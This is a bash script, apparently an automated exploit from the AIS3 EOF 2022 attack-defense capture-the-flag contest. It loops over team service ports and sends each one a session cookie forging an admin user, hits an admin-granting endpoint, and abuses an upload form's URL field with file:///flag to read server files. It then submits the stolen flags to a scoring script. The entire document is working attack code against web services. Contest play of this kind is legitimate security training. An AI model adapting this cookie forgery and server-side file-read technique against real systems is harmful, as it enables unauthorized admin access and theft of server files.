#!/bin/bash

for j in 1 `seq 18 42`
do
	i=$(( $j + 30000 ))
	flagurl=''
	flag=''
	curl 'http://chals2.eof.ais3.org:'$i'/admin/give-admin' -H 'Cookie: session=84732d971a68603a4116d365e87fe33bff2b953f.YToxOntzOjQ6InVzZXIiO2E6Mjp7czoyOiJpZCI7aToxO3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fX0%3D' --data-raw 'user_id='$userid &
	flagurl=$(curl -s 'http://chals2.eof.ais3.org:'$i'/upload' -H 'Cookie: session=84732d971a68603a4116d365e87fe33bff2b953f.YToxOntzOjQ6InVzZXIiO2E6Mjp7czoyOiJpZCI7aToxO3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fX0%3D' --data-raw $'------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="url"\r\n\r\nfile:///flag\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm--\r\n' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE9hwBFtBLrkMrXmm' | grep -oP 'url=.+/view/\K.*?(?=")') && flag=$(curl -s 'http://chals2.eof.ais3.org:'$i'/uploads/'"$flagurl"'.jpg' -H 'Cookie: session=84732d971a68603a4116d365e87fe33bff2b953f.YToxOntzOjQ6InVzZXIiO2E6Mjp7czoyOiJpZCI7aToxO3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fX0%3D') && bash /home/eof2022/score.sh $j "$flag" | jq . &
done
